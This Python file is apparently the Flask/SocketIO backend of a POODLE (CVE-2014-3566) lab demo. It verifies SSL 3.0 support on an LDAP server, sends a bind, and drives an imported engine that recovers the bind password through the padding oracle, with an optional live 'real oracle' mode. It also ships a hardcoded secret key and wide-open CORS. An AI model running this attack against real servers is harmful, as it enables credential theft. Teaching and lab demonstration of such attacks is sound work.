"""server.py — Flask + SocketIO backend for POODLE CVE-2014-3566 demo."""

import time
import threading

from flask import Flask, render_template
from flask_socketio import SocketIO, emit

from ssl3_verify import verify_ssl3, ldap_bind_ssl3
from poodle_engine import PoodleEngine, RealOracle

app = Flask(__name__)
app.config["SECRET_KEY"] = "poodle-lab-demo"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

active_attacks: dict[str, PoodleEngine] = {}


@app.route("/")
def index():
    return render_template("index.html")


@socketio.on("verify")
def handle_verify(data):
    host = data.get("host", "192.168.56.50")
    port = int(data.get("port", 636))

    emit("log", {"msg": f"[REAL] Running nmap ssl-poodle against {host}:{port}...", "level": "info"})
    result = verify_ssl3(host, port)

    if result["vulnerable"]:
        emit("log", {"msg": f"[REAL] SSL 3.0 ACCEPTED — cipher: {result['cipher_suite']}", "level": "success"})
        if result["cipher_is_cbc"]:
            emit("log", {"msg": "[REAL] CBC cipher confirmed — POODLE attack is possible", "level": "success"})
        else:
            emit("log", {"msg": f"[REAL] WARNING: cipher {result['cipher_suite']} may not be CBC", "level": "warn"})
    else:
        emit("log", {"msg": f"[REAL] SSL 3.0 FAILED: {result.get('error', 'unknown')}", "level": "error"})

    emit("verify_result", result)


@socketio.on("ldap_bind")
def handle_ldap_bind(data):
    host = data.get("host", "192.168.56.50")
    port = int(data.get("port", 636))
    dn = data.get("bind_dn", "labuser@lab.local")
    password = data.get("bind_password", "")

    emit("log", {"msg": f"[REAL] Sending LDAP Simple Bind to {host}:{port} over SSL 3.0...", "level": "info"})
    emit("log", {"msg": f"[REAL] DN: {dn}", "level": "info"})

    result = ldap_bind_ssl3(host, port, dn, password)

    if result["bind_success"]:
        emit("log", {"msg": "[REAL] LDAP Bind SUCCESS — credentials valid over SSL 3.0", "level": "success"})
    elif result["error"]:
        emit("log", {"msg": f"[REAL] LDAP Bind FAILED: {result['error']}", "level": "error"})
    else:
        rc = result.get("result_code", "?")
        emit("log", {"msg": f"[REAL] LDAP Bind rejected (resultCode={rc})", "level": "warn"})

    if result["request_hex"]:
        emit("log", {"msg": f"[REAL] Request:  {result['request_hex'][:80]}...", "level": "info"})
    if result["response_hex"]:
        emit("log", {"msg": f"[REAL] Response: {result['response_hex'][:80]}...", "level": "info"})

    emit("ldap_bind_result", result)


@socketio.on("start_attack")
def handle_start_attack(data):
    from flask import request
    sid = request.sid

    if sid in active_attacks:
        active_attacks[sid].stop()
        del active_attacks[sid]

    host = data.get("host", "192.168.56.50")
    port = int(data.get("port", 636))
    bind_dn = data.get("bind_dn", "labuser@lab.local")
    bind_password = data.get("bind_password", "")
    speed = data.get("speed", "normal")
    use_real = data.get("real_oracle", False)

    if not bind_password:
        emit("log", {"msg": "Password is required", "level": "error"})
        return

    # Phase 1: Real verification
    emit("log", {"msg": f"[REAL] Verifying SSL 3.0 on {host}:{port}...", "level": "info"})
    ssl_result = verify_ssl3(host, port)
    emit("verify_result", ssl_result)

    if not ssl_result["vulnerable"]:
        emit("log", {"msg": "[REAL] Target does NOT accept SSL 3.0 — attack aborted", "level": "error"})
        emit("attack_aborted", {"reason": "SSL 3.0 not available on target"})
        return

    emit("log", {"msg": f"[REAL] Confirmed: {host}:{port} accepts SSL 3.0 with {ssl_result['cipher_suite']}", "level": "success"})

    # Phase 2: Attack
    delay = {"slow": 0.008, "normal": 0.003, "fast": 0.0005}.get(speed, 0.003)

    real_oracle_obj = None
    if use_real:
        real_oracle_obj = RealOracle(host, port, dn_base=bind_dn)
        mode_tag = "REAL"
        emit("log", {"msg": f"[REAL] Real oracle mode — each query opens SSL 3.0 connection to {host}:{port}", "level": "info"})
    else:
        mode_tag = "SIM"

    engine = PoodleEngine(bind_password, attempt_delay=delay, real_oracle=real_oracle_obj)
    active_attacks[sid] = engine
    start_time = time.time()

    emit("log", {"msg": f"[{mode_tag}] Starting POODLE oracle attack — recovering {len(bind_password)} bytes", "level": "info"})
    emit("log", {"msg": f"[{mode_tag}] Each oracle query has 1/256 probability of success", "level": "info"})

    def attack_callback(event_type, event_data):
        if event_type == "started":
            socketio.emit("attack_started", event_data, to=sid)

        elif event_type == "attempt":
            socketio.emit("attempt", event_data, to=sid)

        elif event_type == "byte_recovered":
            event_data["elapsed"] = round(time.time() - start_time, 2)
            socketio.emit("byte_recovered", event_data, to=sid)
            socketio.emit("log", {
                "msg": (f"[{mode_tag}] Byte {event_data['byte_index']}: "
                        f"0x{event_data['byte_value']:02X} = '{event_data['byte_char']}' "
                        f"after {event_data['attempts']} oracle queries"),
                "level": "success",
            }, to=sid)

        elif event_type == "complete":
            event_data["elapsed"] = round(time.time() - start_time, 2)
            socketio.emit("attack_complete", event_data, to=sid)
            socketio.emit("log", {
                "msg": (f"[{mode_tag}] COMPLETE: \"{event_data['full_message']}\" — "
                        f"{event_data['total_attempts']} queries, "
                        f"{event_data['elapsed']}s, "
                        f"avg {event_data['avg_attempts_per_byte']:.0f}/byte"),
                "level": "success",
            }, to=sid)

    def run():
        try:
            engine.run_attack(attack_callback)
        except Exception as e:
            socketio.emit("log", {"msg": f"Attack error: {e}", "level": "error"}, to=sid)
        finally:
            active_attacks.pop(sid, None)

    thread = threading.Thread(target=run, daemon=True)
    thread.start()


@socketio.on("stop_attack")
def handle_stop_attack():
    from flask import request
    sid = request.sid
    if sid in active_attacks:
        active_attacks[sid].stop()
        del active_attacks[sid]
        emit("attack_stopped", {})
        emit("log", {"msg": "Attack stopped", "level": "warn"})


@socketio.on("disconnect")
def handle_disconnect():
    from flask import request
    sid = request.sid
    if sid in active_attacks:
        active_attacks[sid].stop()
        del active_attacks[sid]


if __name__ == "__main__":
    print("POODLE CVE-2014-3566 Demo — http://0.0.0.0:5000")
    socketio.run(app, host="0.0.0.0", port=5000, debug=False, allow_unsafe_werkzeug=True)
